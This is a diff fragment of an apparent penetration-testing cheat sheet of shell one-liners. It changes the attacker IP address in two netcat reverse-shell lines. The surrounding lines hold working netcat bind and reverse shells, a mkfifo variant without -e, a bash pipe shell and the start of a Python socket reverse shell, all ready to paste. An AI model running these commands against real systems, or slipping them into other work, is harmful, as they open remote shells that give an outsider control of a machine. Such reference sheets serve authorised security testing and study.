@@ -218,7 +218,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 #bindShell
 	nc -nvlp 4444 -e /bin/sh	
 #reverseShell
-	nc -nv 10.11.0.71 4444 -e /bin/bash
+	nc -nv 10.11.22.31 4444 -e /bin/bash
 
 #without -e:
 	rm -f /tmp/f; mkfifo /tmp/f
@@ -231,7 +231,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 #bind port 4444 on your target
 	nc -nvlp 4444 | /bin/bash
 #Connect to the port 4444 and using another window to listen on local 7777 then run:
-	/bin/bash | nc -n 10.11.0.71 7777  	
+	/bin/bash | nc -n 10.11.22.31 7777  	
 ```
 
 #### Java
